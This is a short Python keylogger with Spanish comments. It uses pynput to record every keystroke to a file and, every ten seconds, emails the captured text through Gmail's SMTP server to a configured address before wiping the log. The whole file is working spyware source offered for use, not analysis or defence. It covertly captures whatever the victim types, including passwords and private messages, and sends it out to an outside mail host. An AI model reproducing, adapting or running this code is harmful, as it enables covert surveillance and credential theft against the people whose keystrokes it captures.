from pynput import keyboard
import logging
import time
import datetime
import smtplib

# Configuraciones
carpeta_destino = 'Ruta_donde_quieres_que_se_guarde_lo_que_se_teclea'
segundos_espera = 10
timeout = time.time() + segundos_espera

# Configurar logging
logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')

# Registrar teclas
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

# Función de timeout
def TimeOut():
    return time.time() > timeout

# Enviar por correo
def EnviarEmail():
    with open(carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace('Key.space', ' ')
        data = data.replace('\n', '')
        data = f"Mensaje capturado a las: {fecha}\n{data}"
        print(data)
        crearEmail(
            user='tu_correo_electronico',
            passw='tu_contraseña_de_aplicación',
            recep='tu_correo_electronico',
            subj='Nueva captura: ' + fecha,
            body=data
        )
        f.seek(0)
        f.truncate()

# Enviar correo
def crearEmail(user, passw, recep, subj, body):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(user, passw)
        email = f"""From: {user}\nTo: {recep}\nSubject: {subj}\n\n{body}"""
        server.sendmail(user, recep, email)
        server.quit()
        print("Correo enviado con éxito.")
    except Exception as e:
        print("Error al enviar correo:", e)

# Iniciar listener
def iniciar_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            global timeout
            if TimeOut():
                EnviarEmail()
                timeout = time.time() + segundos_espera
            time.sleep(1)  # Evitar uso excesivo de CPU

# Ejecutar programa
iniciar_listener()
